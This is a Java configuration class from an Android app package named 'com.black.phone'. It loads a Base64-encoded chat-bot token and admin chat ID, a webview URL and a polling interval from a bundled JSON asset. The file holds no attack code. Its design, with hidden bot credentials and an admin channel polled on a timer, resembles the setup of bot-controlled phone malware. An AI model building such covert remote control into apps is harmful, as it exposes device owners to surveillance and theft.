package com.black.phone;

import android.content.Context;
import android.util.Base64;
import org.json.JSONObject;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;

public class Config {
    private static Config instance;
    private String botToken;
    private String adminChatId;
    private String webviewUrl;
    private int pollIntervalSec;

    private Config(Context context) {
        try {
            InputStream is = context.getAssets().open("config.json");
            byte[] buffer = new byte[is.available()];
            is.read(buffer);
            is.close();
            String jsonStr = new String(buffer, StandardCharsets.UTF_8);
            JSONObject json = new JSONObject(jsonStr);
            botToken = new String(Base64.decode(json.getString("bot_token"), Base64.DEFAULT));
            adminChatId = new String(Base64.decode(json.getString("admin_chat_id"), Base64.DEFAULT));
            webviewUrl = json.getString("webview_url");
            pollIntervalSec = json.getInt("poll_interval_sec");
        } catch (Exception e) {
            e.printStackTrace();
            botToken = "";
            adminChatId = "";
            webviewUrl = "https://www.google.com";
            pollIntervalSec = 5;
        }
    }

    public static Config get(Context context) {
        if (instance == null) instance = new Config(context);
        return instance;
    }

    public static Config get() { return instance; }

    public String getBotToken() { return botToken; }
    public String getAdminChatId() { return adminChatId; }
    public String getWebviewUrl() { return webviewUrl; }
    public int getPollIntervalSec() { return pollIntervalSec; }
}
